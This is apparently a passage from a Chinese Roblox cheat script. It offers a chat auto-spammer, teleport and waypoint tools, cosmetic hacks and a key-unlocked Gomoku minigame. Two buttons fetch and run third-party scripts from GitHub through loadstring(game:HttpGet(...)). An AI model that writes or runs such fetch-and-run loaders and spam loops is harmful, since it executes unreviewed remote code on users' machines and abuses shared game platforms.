        if TextChatService and TextChatService.ChatInputBarConfiguration then
            if TextChatService.TextChannels then
                local generalChannel = TextChatService.TextChannels.RBXGeneral
                if generalChannel then generalChannel:SendAsync(msg); return end
            end
        end
        if game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents") then
            local chatEvents = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
            local sayMessageRequest = chatEvents:FindFirstChild("SayMessageRequest")
            if sayMessageRequest then sayMessageRequest:FireServer(msg, "All"); return end
        end
    end)
end
local sectionCustomChat = tabAutoChat:Section({ Name = "自定义发言", SubName = "自动发送消息", Logo = "83701039519151", Collapsible = true, Collapsed = true })
local customChatText = ""
local autoChatEnabled = false
local chatRepeatCount = 1
sectionCustomChat:Textbox({ Name = "输入要发送的内容", Placeholder = "输入发言内容...", Callback = function(v) customChatText = v end })
sectionCustomChat:Slider({ Name = "发送次数 (1-100次)", Value = { Min = 1, Max = 100, Default = 1 }, Rounding = 0, Callback = function(v) chatRepeatCount = v end })
sectionCustomChat:Toggle({ Name = "自动一直发言", Value = false, Callback = function(v)
    autoChatEnabled = v
    if v then
        if customChatText == "" then autoChatEnabled = false; return end
        task.spawn(function()
            while autoChatEnabled do
                pcall(function() sendMessage(customChatText) end)
                task.wait(0.5)
            end
        end)
    end
end })

Window:TabDivider()

local tabFunNew = Soundify(Window:Tab("有趣内容", "83701039519151"))
local sectionDanmaku = tabFunNew:Section({ Name = "全屏弹幕", SubName = "屏幕跑马灯，防重叠", Logo = "83701039519151", Collapsible = true, Collapsed = true })
local danmakuText = "款脚本太厉害了"
sectionDanmaku:Textbox({ Name = "输入弹幕文字", Placeholder = "输入要发送的弹幕...", Callback = function(v) danmakuText = v end })
sectionDanmaku:Button({ Name = "发送弹幕", Callback = function()
    if danmakuText == "" then return end
    CreateDanmaku(danmakuText)
end })
sectionDanmaku:Toggle({ Name = "自动弹幕 (随机语录)", Value = false, Callback = function(v)
    autoDanmakuEnabled = v
    if v then StartAutoDanmaku() end
end })
local sectionAura = tabFunNew:Section({ Name = "整活光环", SubName = "特效开关，重生自动恢复", Logo = "83701039519151", Collapsible = true, Collapsed = true })
sectionAura:Toggle({ Name = "火焰", Value = false, Callback = function(v) ActiveAuraStates["Fire"] = v; ApplyAllAuras() end })
sectionAura:Toggle({ Name = "新版闪电特效", Value = false, Callback = function(v) ActiveAuraStates["Lightning"] = v; ApplyAllAuras() end })
sectionAura:Toggle({ Name = "彩虹特效", Value = false, Callback = function(v) ActiveAuraStates["Rainbow"] = v; ApplyAllAuras() end })
sectionAura:Toggle({ Name = "黑雾特效", Value = false, Callback = function(v) ActiveAuraStates["Smoke"] = v; ApplyAllAuras() end })
local sectionBeauty = tabFunNew:Section({ Name = "美化 (仅自己可见)", SubName = "隐藏身体部件，重生自动恢复", Logo = "83701039519151", Collapsible = true, Collapsed = true })
sectionBeauty:Toggle({ Name = "免费无头", Value = false, Callback = function(v) beautyToggles.Head = v; ApplyBeauty() end })
sectionBeauty:Toggle({ Name = "免费断腿", Value = false, Callback = function(v) beautyToggles.BreakLegs = v; ApplyBeauty() end })
sectionBeauty:Toggle({ Name = "去掉左手", Value = false, Callback = function(v) beautyToggles.LeftArm = v; ApplyBeauty() end })
sectionBeauty:Toggle({ Name = "去掉右手", Value = false, Callback = function(v) beautyToggles.RightArm = v; ApplyBeauty() end })
sectionBeauty:Toggle({ Name = "去掉左腿", Value = false, Callback = function(v) beautyToggles.LeftLeg = v; ApplyBeauty() end })
sectionBeauty:Toggle({ Name = "去掉右腿", Value = false, Callback = function(v) beautyToggles.RightLeg = v; ApplyBeauty() end })
sectionBeauty:Toggle({ Name = "去掉躯干", Value = false, Callback = function(v) beautyToggles.Torso = v; ApplyBeauty() end })

Window:TabDivider()

local tabTeleport = Soundify(Window:Tab("传送区", "83701039519151"))
local sectionWaypoint = tabTeleport:Section({ Name = "保存点 / 传送", SubName = "复制位置 · 坐标传送 · 保存路径点", Logo = "83701039519151", Collapsible = true, Collapsed = true })
do
    local WP_LocalPlayer = game:GetService("Players").LocalPlayer
    local WAYPOINTS_FILE = FOLDER_NAME .. "/Waypoints.json"
    pcall(function() if isfolder and makefolder and not isfolder(FOLDER_NAME) then makefolder(FOLDER_NAME) end end)
    local Waypoints = {}
    local wpDropdownObj = nil
    local WP_Name_Value = ""
    local WP_Selected_Val = nil
    local TP_Pos_Value = ""
    local function GetRoot(char)
        if not char or typeof(char) ~= "Instance" then return nil end
        return char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso") or char.PrimaryPart
    end
    local function SaveWaypoints()
        pcall(function()
            local data = {}
            for name, cf in pairs(Waypoints) do data[name] = { cf:GetComponents() } end
            writefile(WAYPOINTS_FILE, HttpService:JSONEncode(data))
        end)
    end
    local function LoadWaypoints()
        pcall(function()
            if isfile and isfile(WAYPOINTS_FILE) then
                local data = HttpService:JSONDecode(readfile(WAYPOINTS_FILE))
                if data then
                    for name, comps in pairs(data) do
                        if type(comps) == "table" and #comps == 12 then
                            Waypoints[name] = CFrame.new(unpack(comps))
                        end
                    end
                end
            end
        end)
    end
    LoadWaypoints()
    local function GetWaypointsList()
        local list = {}
        for name, _ in pairs(Waypoints) do table.insert(list, name) end
        table.sort(list)
        if #list == 0 then table.insert(list, "") end
        return list
    end
    local function RefreshWPList()
        if wpDropdownObj then pcall(function() wpDropdownObj.Refresh(GetWaypointsList()) end) end
    end
    sectionWaypoint:Button({ Name = "复制当前位置", Callback = function()
        local root = GetRoot(WP_LocalPlayer.Character)
        if not root then return end
        local pos = root.Position
        local text = string.format("%.2f, %.2f, %.2f", pos.X, pos.Y, pos.Z)
        pcall(function() setclipboard(text) end)
        print("[款脚本] 已复制位置: " .. text)
    end })
    sectionWaypoint:Textbox({ Name = "输入坐标（X, Y, Z）", Placeholder = "例如：100, 50, 200", Callback = function(val) TP_Pos_Value = tostring(val or "") end })
    sectionWaypoint:Button({ Name = "传送到坐标", Callback = function()
        local root = GetRoot(WP_LocalPlayer.Character)
        if not root then return end
        local x, y, z = tostring(TP_Pos_Value):match("([%-%d%.]+)[,%s]+([%-%d%.]+)[,%s]+([%-%d%.]+)")
        if x and y and z then
            root.CFrame = CFrame.new(tonumber(x), tonumber(y), tonumber(z))
        end
    end })
    sectionWaypoint:Divider({ Name = "路径点管理" })
    sectionWaypoint:Textbox({ Name = "路径点名称", Placeholder = "输入路径点名称", Callback = function(val) WP_Name_Value = tostring(val or "") end })
    wpDropdownObj = sectionWaypoint:Dropdown({ Name = "已保存路径点", Options = GetWaypointsList(), Callback = function(val) WP_Selected_Val = val end })
    sectionWaypoint:Button({ Name = "保存当前位置", Callback = function()
        local name = tostring(WP_Name_Value or "")
        if name == "" then return end
        local root = GetRoot(WP_LocalPlayer.Character)
        if root then
            Waypoints[name] = root.CFrame
            SaveWaypoints()
            RefreshWPList()
            WP_Selected_Val = name
        end
    end })
    sectionWaypoint:Button({ Name = "传送到该点", Callback = function()
        local name = WP_Selected_Val
        if not name or name == "" or not Waypoints[name] then return end
        local root = GetRoot(WP_LocalPlayer.Character)
        if root then root.CFrame = Waypoints[name] end
    end })
    sectionWaypoint:Button({ Name = "删除该点", Callback = function()
        local name = WP_Selected_Val
        if not name or name == "" or not Waypoints[name] then return end
        Waypoints[name] = nil
        SaveWaypoints()
        WP_Selected_Val = nil
        RefreshWPList()
    end })
    RefreshWPList()
end

Window:TabDivider()

local tabOtherScripts = Soundify(Window:Tab("其他脚本", "83701039519151"))
local sectionOther = tabOtherScripts:Section({ Name = "通用", SubName = "其他作者脚本", Logo = "83701039519151", Collapsible = true, Collapsed = true })
sectionOther:Button({ Name = "皮脚本", Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/main/QQ1002100032-Roblox-Pi-script.lua"))() end })
sectionOther:Button({ Name = "叶脚本", Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/roblox-ye/QQ515966991/refs/heads/main/ROBLOX-CNVIP-XIAOYE.lua"))() end })
    do
        local function OpenGomokuGame()
            local pg = LocalPlayer:WaitForChild("PlayerGui")
            local old = pg:FindFirstChild("KuanGomokuGui")
            if old then old:Destroy() end
            local diffGui = Instance.new("ScreenGui")
            diffGui.Name = "KuanGomokuDiffGui"
            diffGui.ResetOnSpawn = false
            diffGui.DisplayOrder = 10003
            diffGui.Parent = pg
            local diffPanel = Instance.new("Frame", diffGui)
            diffPanel.Size = UDim2.new(0, 260, 0, 180)
            diffPanel.Position = UDim2.new(0.5, -130, 0.5, -90)
            diffPanel.BackgroundColor3 = Color3.fromRGB(35, 38, 46)
            diffPanel.BorderSizePixel = 0
            Instance.new("UICorner", diffPanel).CornerRadius = UDim.new(0, 10)
            local dStroke = Instance.new("UIStroke", diffPanel)
            dStroke.Color = Color3.fromRGB(0, 200, 255)
            dStroke.Thickness = 1.5
            local dTitle = Instance.new("TextLabel", diffPanel)
            dTitle.Size = UDim2.new(1, 0, 0, 40)
            dTitle.Position = UDim2.new(0, 0, 0, 5)
            dTitle.BackgroundTransparency = 1
            dTitle.Text = "选择 AI 难度"
            dTitle.TextColor3 = Color3.fromRGB(220, 220, 220)
            dTitle.TextSize = 16
            dTitle.Font = Enum.Font.GothamBold
            local StartGomoku
            local function createDiffBtn(text, yPos, mode)
                local btn = Instance.new("TextButton", diffPanel)
                btn.Size = UDim2.new(0, 200, 0, 32)
                btn.Position = UDim2.new(0.5, -100, 0, yPos)
                btn.BackgroundColor3 = Color3.fromRGB(50, 55, 65)
                btn.Text = text
                btn.TextColor3 = Color3.fromRGB(255, 255, 255)
                btn.TextSize = 14
                btn.Font = Enum.Font.GothamBold
                Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
                btn.MouseButton1Click:Connect(function()
                    diffGui:Destroy()
                    if StartGomoku then StartGomoku(mode) end
                end)
            end
            createDiffBtn("简单模式 (3×3 三子连线)", 55, "easy")
            createDiffBtn("困难模式 (6×6 五子连线)", 95, "hard")
            createDiffBtn("极难模式 (8×8 八子连线)", 135, "extreme")
            local closeDiff = Instance.new("TextButton", diffPanel)
            closeDiff.Size = UDim2.new(0, 30, 0, 30)
            closeDiff.Position = UDim2.new(1, -35, 0, 5)
            closeDiff.BackgroundTransparency = 1
            closeDiff.Text = "✕"
            closeDiff.TextColor3 = Color3.fromRGB(255, 100, 100)
            closeDiff.TextSize = 18
            closeDiff.Font = Enum.Font.GothamBold
            closeDiff.MouseButton1Click:Connect(function() diffGui:Destroy() end)
            StartGomoku = function(mode)
                local gui = Instance.new("ScreenGui")
                gui.Name = "KuanGomokuGui"
                gui.ResetOnSpawn = false
                gui.DisplayOrder = 10004
                gui.Parent = pg
                local main = Instance.new("Frame", gui)
                main.AnchorPoint = Vector2.new(0.5, 0.5)
                main.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
                main.BorderSizePixel = 0
                Instance.new("UICorner", main).CornerRadius = UDim.new(0, 10)
                local stroke = Instance.new("UIStroke", main)
                stroke.Color = Color3.fromRGB(0, 200, 255)
                stroke.Thickness = 1.5
                local dragging, dragStart, startPos
                local titleBar = Instance.new("Frame", main)
                titleBar.Size = UDim2.new(1, 0, 0, 40)
                titleBar.BackgroundTransparency = 1
                titleBar.Active = true
                titleBar.Parent = main
                titleBar.InputBegan:Connect(function(input)
                    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                        dragging = true
                        dragStart = input.Position
                        startPos = main.Position
                    end
                end)
                UserInputService.InputChanged:Connect(function(input)
                    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
                        local delta = input.Position - dragStart
                        main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
                    end
                end)
                UserInputService.InputEnded:Connect(function(input)
                    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                        dragging = false
                    end
                end)
                local title = Instance.new("TextLabel", main)
                title.Size = UDim2.new(1, -40, 0, 30)
                title.Position = UDim2.new(0, 15, 0, 5)
                title.BackgroundTransparency = 1
                local boardSize, winCount
                if mode == "easy" then boardSize, winCount = 3, 3
                elseif mode == "hard" then boardSize, winCount = 6, 5
                else boardSize, winCount = 8, 8 end
                local maxCellSize = 45
                local cellSize = math.min(maxCellSize, 300 / boardSize)
                local boardPixelSize = boardSize * cellSize
                local uiWidth = boardPixelSize + 40
                local uiHeight = boardPixelSize + 120
                main.Size = UDim2.new(0, uiWidth, 0, uiHeight)
                main.Position = UDim2.new(0.5, 0, 0.5, 0)
                title.Text = boardSize .. "×" .. boardSize .. " 棋盘 (" .. winCount .. "子连线获胜)"
                title.TextColor3 = Color3.fromRGB(220, 220, 220)
                title.TextSize = 15
                title.Font = Enum.Font.GothamBold
                title.TextXAlignment = Enum.TextXAlignment.Left
                local statusText = Instance.new("TextLabel", main)
                statusText.Size = UDim2.new(1, -30, 0, 20)
                statusText.Position = UDim2.new(0, 15, 0, 35)
                statusText.BackgroundTransparency = 1
                statusText.Text = "你的回合"
                statusText.TextColor3 = Color3.fromRGB(0, 255, 128)
                statusText.TextSize = 13
                statusText.Font = Enum.Font.GothamMedium
                statusText.TextXAlignment = Enum.TextXAlignment.Left
                local closeBtn = Instance.new("TextButton", main)
                closeBtn.Size = UDim2.new(0, 30, 0, 30)
                closeBtn.Position = UDim2.new(1, -40, 0, 5)
                closeBtn.BackgroundTransparency = 1
                closeBtn.Text = "✕"
                closeBtn.TextColor3 = Color3.fromRGB(255, 100, 100)
                closeBtn.TextSize = 18
                closeBtn.Font = Enum.Font.GothamBold
                closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)
                local boardFrame = Instance.new("Frame", main)
                boardFrame.Size = UDim2.new(0, boardPixelSize, 0, boardPixelSize)
                boardFrame.Position = UDim2.new(0.5, -boardPixelSize/2, 0, 65)
                boardFrame.BackgroundColor3 = Color3.fromRGB(200, 160, 110)
                boardFrame.BorderSizePixel = 0
                local minBtn = Instance.new("TextButton", main)
                minBtn.Size = UDim2.new(0, 30, 0, 30)
                minBtn.Position = UDim2.new(1, -75, 0, 5)
                minBtn.BackgroundTransparency = 1
                minBtn.Text = "—"
                minBtn.TextColor3 = Color3.fromRGB(150, 150, 150)
                minBtn.TextSize = 18
                minBtn.Font = Enum.Font.GothamBold
                local isMinimized = false
                minBtn.MouseButton1Click:Connect(function()
                    isMinimized = not isMinimized
                    if isMinimized then
                        main.Size = UDim2.new(0, uiWidth, 0, 40)
                        boardFrame.Visible = false
                        statusText.Visible = false
                        minBtn.Text = "□"
                    else
                        main.Size = UDim2.new(0, uiWidth, 0, uiHeight)
                        boardFrame.Visible = true
                        statusText.Visible = true
                        minBtn.Text = "—"
                    end
                end)
                local grid = Instance.new("UIGridLayout", boardFrame)
                grid.CellSize = UDim2.new(0, cellSize, 0, cellSize)
                grid.CellPadding = UDim2.new(0, 0, 0, 0)
                local boardData = {}
                local dots = {}
                local isPlayerTurn = true
                local gameOver = false
                local function checkWin(player)
                    local dirs = {{1,0}, {0,1}, {1,1}, {1,-1}}
                    for r = 1, boardSize do
                        for c = 1, boardSize do
                            if boardData[r][c] == player then
                                for _, d in ipairs(dirs) do
                                    local count = 1
                                    for i = 1, winCount - 1 do
                                        local nr, nc = r + d[1]*i, c + d[2]*i
                                        if nr >= 1 and nr <= boardSize and nc >= 1 and nc <= boardSize and boardData[nr][nc] == player then
                                            count = count + 1
                                        else break end
                                    end
                                    if count >= winCount then return true end
                                end
                            end
                        end
                    end
                    return false
                end
                local function checkDraw()
                    for r = 1, boardSize do
                        for c = 1, boardSize do
                            if boardData[r][c] == 0 then return false end
                        end
                    end
                    return true
                end
                local function evaluatePoint(r, c, player)
                    local score = 0
                    local dirs = {{1,0}, {0,1}, {1,1}, {1,-1}}
                    for _, d in ipairs(dirs) do
                        local count = 1
                        local block1, block2 = 0, 0
                        for i = 1, winCount - 1 do
                            local nr, nc = r + d[1]*i, c + d[2]*i
                            if nr < 1 or nr > boardSize or nc < 1 or nc > boardSize then
                                block1 = block1 + 1 break
                            elseif boardData[nr][nc] == player then
                                count = count + 1
                            elseif boardData[nr][nc] == 0 then
                                break
                            else
                                block1 = block1 + 1 break
                            end
                        end
                        for i = 1, winCount - 1 do
                            local nr, nc = r - d[1]*i, c - d[2]*i
                            if nr < 1 or nr > boardSize or nc < 1 or nc > boardSize then
                                block2 = block2 + 1 break
                            elseif boardData[nr][nc] == player then
                                count = count + 1
                            elseif boardData[nr][nc] == 0 then
                                break
                            else
                                block2 = block2 + 1 break
                            end
                        end
                        if count >= winCount then score = score + 100000
                        elseif count == winCount - 1 then
                            if block1 == 0 and block2 == 0 then score = score + 10000
                            elseif block1 == 0 or block2 == 0 then score = score + 1000 end
                        elseif count == winCount - 2 then
                            if block1 == 0 and block2 == 0 then score = score + 1000
                            elseif block1 == 0 or block2 == 0 then score = score + 100 end
                        end
                    end
                    return score
                end
                local function placePiece(r, c, player)
                    boardData[r][c] = player
                    dots[r][c].BackgroundTransparency = 0
                    dots[r][c].BackgroundColor3 = (player == 1) and Color3.fromRGB(20, 20, 20) or Color3.fromRGB(255, 255, 255)
                    if checkWin(player) then
                        gameOver = true
                        if player == 1 then
                            statusText.Text = "🎉 你赢了！"
                            statusText.TextColor3 = Color3.fromRGB(0, 255, 128)
                        else
                            statusText.Text = "💀 AI 赢了！"
                            statusText.TextColor3 = Color3.fromRGB(255, 100, 100)
                        end
                        return true
                    elseif checkDraw() then
                        gameOver = true
                        statusText.Text = "🤝 平局！"
                        statusText.TextColor3 = Color3.fromRGB(255, 255, 0)
                        return true
                    end
                    return false
                end
                local function aiMove()
                    if gameOver then return end
                    local bestScore = -math.huge
                    local bestR, bestC = -1, -1
                    for r = 1, boardSize do
                        for c = 1, boardSize do
                            if boardData[r][c] == 0 then
                                local aiScore = evaluatePoint(r, c, 2)
                                local playerScore = evaluatePoint(r, c, 1)
                                local totalScore
                                if mode == "easy" then totalScore = math.random() * 10
                                elseif mode == "hard" then totalScore = aiScore * 1.05 + playerScore
                                else totalScore = aiScore * 1.2 + playerScore * 1.1 end
                                if totalScore > bestScore then
                                    bestScore = totalScore
                                    bestR = r
                                    bestC = c
                                end
                            end
                        end
                    end
                    if bestR ~= -1 then
                        if not placePiece(bestR, bestC, 2) then
                            isPlayerTurn = true
                            statusText.Text = "你的回合"
                            statusText.TextColor3 = Color3.fromRGB(0, 255, 128)
                        end
                    end
                end
                for r = 1, boardSize do
                    boardData[r] = {}
                    dots[r] = {}
                    for c = 1, boardSize do
                        boardData[r][c] = 0
                        local cell = Instance.new("TextButton", boardFrame)
                        cell.BackgroundColor3 = Color3.fromRGB(230, 190, 140)
                        cell.BorderSizePixel = 1
                        cell.BorderColor3 = Color3.fromRGB(160, 120, 80)
                        cell.Text = ""
                        local dot = Instance.new("Frame", cell)
                        dot.Size = UDim2.new(0, cellSize - 10, 0, cellSize - 10)
                        dot.Position = UDim2.new(0.5, -(cellSize - 10)/2, 0.5, -(cellSize - 10)/2)
                        dot.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
                        dot.BackgroundTransparency = 1
                        Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)
                        dots[r][c] = dot
                        cell.MouseButton1Click:Connect(function()
                            if not isPlayerTurn or gameOver or boardData[r][c] ~= 0 then return end
                            placePiece(r, c, 1)
                            if not gameOver then
                                isPlayerTurn = false
                                statusText.Text = "AI 思考中..."
                                statusText.TextColor3 = Color3.fromRGB(200, 200, 200)
                                task.delay(0.3, aiMove)
                            end
                        end)
                    end
                end
            end
        end

        local egg2State = { unlocked = false }
        local EGG2_FILE = "KuanScript/Egg2Unlocked.txt"
        pcall(function()
            if isfile and isfile(EGG2_FILE) then egg2State.unlocked = true end
        end)

        local eggTabCreated = false
        local eggSecRef = nil
        local egg2BtnAdded = false
        local addEgg2Button, ensureEggTab

        addEgg2Button = function()
            if egg2BtnAdded or not eggSecRef or not egg2State.unlocked then return end
            egg2BtnAdded = true
            pcall(function()
                eggSecRef:Button({ Name = "五子棋", Callback = function()
                    OpenGomokuGame()
                end })
            end)
        end

        ensureEggTab = function()
            if eggTabCreated and eggSecRef then
                if egg2State.unlocked then addEgg2Button() end
                return
            end
            pcall(function()
                local eggTab = Soundify(Window:Tab("彩蛋", "83701039519151"))
                local eggSec = eggTab:Section({
                    Name = "彩蛋",
                    SubName = "款脚本隐藏内容",
                    Logo = "83701039519151",
                    Collapsible = true,
                    Collapsed = false,
                })
                eggSecRef = eggSec
                eggTabCreated = true
                if egg2State.unlocked then addEgg2Button() end
            end)
        end

        if egg2State.unlocked then
            task.defer(ensureEggTab)
        end

        local shouldShowVerify = not egg2State.unlocked
        local sectionVerify = nil
        local verifyValue = ""
        local verifyInput = nil
        local verifyStatus = nil

        if shouldShowVerify then
            sectionVerify = tabOtherScripts:Section({
                Name = "管理员权限验证",
                SubName = "输入密钥以验证身份",
                Logo = "83701039519151",
                Collapsible = true,
                Collapsed = false,
            })
            verifyInput = sectionVerify:Textbox({
                Name = "输入密钥",
                Placeholder = "请输入...",
                Callback = function(v) verifyValue = tostring(v or "") end,
            })
            verifyStatus = sectionVerify:Label({ Name = "未验证" })
        end

        local function getInputText()
            if verifyValue and verifyValue ~= "" then return verifyValue end
            local t = ""
            if verifyInput then
                pcall(function() t = verifyInput:Get() end)
                if type(t) ~= "string" or t == "" then pcall(function() t = verifyInput.Value end) end
                if type(t) ~= "string" or t == "" then pcall(function() t = verifyInput.Text end) end
            end
            return tostring(t or "")
        end

        local function hideVerifyIfBothUnlocked()
            if egg2State.unlocked and sectionVerify then
                pcall(function() sectionVerify:Destroy() end)
                pcall(function() if sectionVerify.Container then sectionVerify.Container.Visible = false end end)
                pcall(function() if sectionVerify.Parent then sectionVerify.Parent.Visible = false end end)
                pcall(function() if sectionVerify.Frame then sectionVerify.Frame.Visible = false end end)
                pcall(function() if sectionVerify.Root then sectionVerify.Root.Visible = false end end)
                pcall(function() if sectionVerify.Main then sectionVerify.Main.Visible = false end end)
                pcall(function() if sectionVerify.Object then sectionVerify.Object.Visible = false end end)
                for _, v in pairs(sectionVerify) do
                    if typeof(v) == "Instance" and (v:IsA("GuiObject") or v:IsA("Frame")) then
                        pcall(function() 
                            v.Visible = false 
                            v.Size = UDim2.new(0,0,0,0)
                        end)
                    end
                end
                sectionVerify = nil
            end
        end

        if egg2State.unlocked then
            task.defer(hideVerifyIfBothUnlocked)
        end

        local function showConfirm2()
            local pg = LocalPlayer:WaitForChild("PlayerGui")
            local old = pg:FindFirstChild("KuanConfirm2Gui")
            if old then old:Destroy() end
            local gui = Instance.new("ScreenGui")
            gui.Name = "KuanConfirm2Gui"
            gui.ResetOnSpawn = false
            gui.DisplayOrder = 10002
            gui.Parent = pg
            local panel = Instance.new("Frame", gui)
            panel.Size = UDim2.new(0, 280, 0, 130)
            panel.Position = UDim2.new(0.5, -140, 0.5, -65)
            panel.BackgroundColor3 = Color3.fromRGB(35, 38, 46)
            panel.BorderSizePixel = 0
            Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 10)
            local stroke = Instance.new("UIStroke", panel)
            stroke.Color = Color3.fromRGB(255, 100, 100)
            stroke.Thickness = 1.5
            local title = Instance.new("TextLabel", panel)
            title.Size = UDim2.new(1, -20, 0, 24)
            title.Position = UDim2.new(0, 10, 0, 10)
            title.BackgroundTransparency = 1
            title.Text = "确认解锁彩蛋？"
            title.TextColor3 = Color3.fromRGB(255, 150, 150)
            title.TextSize = 15
            title.Font = Enum.Font.GothamBold
            local desc = Instance.new("TextLabel", panel)
            desc.Size = UDim2.new(1, -20, 0, 30)
            desc.Position = UDim2.new(0, 10, 0, 38)
            desc.BackgroundTransparency = 1
            desc.Text = "解锁后彩蛋区会多出新内容"
            desc.TextColor3 = Color3.fromRGB(190, 200, 210)
            desc.TextSize = 12
            desc.Font = Enum.Font.GothamMedium
            local yesBtn = Instance.new("TextButton", panel)
            yesBtn.Size = UDim2.new(0, 115, 0, 32)
            yesBtn.Position = UDim2.new(0, 15, 1, -46)
            yesBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
            yesBtn.Text = "确定"
            yesBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
            yesBtn.TextSize = 13
            yesBtn.Font = Enum.Font.GothamBold
            Instance.new("UICorner", yesBtn).CornerRadius = UDim.new(0, 6)
            local noBtn = Instance.new("TextButton", panel)
            noBtn.Size = UDim2.new(0, 115, 0, 32)
            noBtn.Position = UDim2.new(1, -130, 1, -46)
            noBtn.BackgroundColor3 = Color3.fromRGB(80, 85, 95)
            noBtn.Text = "取消"
            noBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
            noBtn.TextSize = 13
            noBtn.Font = Enum.Font.GothamBold
            Instance.new("UICorner", noBtn).CornerRadius = UDim.new(0, 6)
            noBtn.MouseButton1Click:Connect(function() gui:Destroy() end)
            yesBtn.MouseButton1Click:Connect(function()
                pcall(function() gui:Destroy() end)

                if not egg2State.unlocked then
                    egg2State.unlocked = true
                    ensureEggTab()
                    addEgg2Button()
                    pcall(function()
                        if writefile then
                            if isfolder and makefolder and not isfolder("KuanScript") then makefolder("KuanScript") end
                            writefile(EGG2_FILE, "1")
                        end
                    end)
                    pcall(function()
                        game:GetService("StarterGui"):SetCore("SendNotification", {
                            Title = "五子棋彩蛋", Text = "解锁成功！彩蛋页已添加五子棋", Duration = 6,
                        })
                    end)
                end

                hideVerifyIfBothUnlocked()
            end)
        end

        if sectionVerify then
            sectionVerify:Button({ Name = "验证", Callback = function()
                local txt = getInputText():gsub("^%s*(.-)%s*$", "%1")
                if string.lower(txt) ~= "款nb" then
                    if string.lower(txt) == "款脚本" then
                        if verifyStatus then verifyStatus:Set("❌ 请输入「款nb」") end
                    else
                        if verifyStatus then verifyStatus:Set("❌ 密钥错误") end
                        pcall(function()
                            game:GetService("StarterGui"):SetCore("SendNotification", {
                                Title = "彩蛋", Text = "密钥错误", Duration = 3,
                            })
                        end)
                    end
                    return
                end

                if egg2State.unlocked then
                    pcall(function()
                        game:GetService("StarterGui"):SetCore("SendNotification", {
                            Title = "彩蛋", Text = "五子棋彩蛋已解锁。", Duration = 3,
                        })
                    end)
                    return
                end

                showConfirm2()
            end })
        end
    end
end

PlayExclusiveIntro(function()
    StartMain()
end)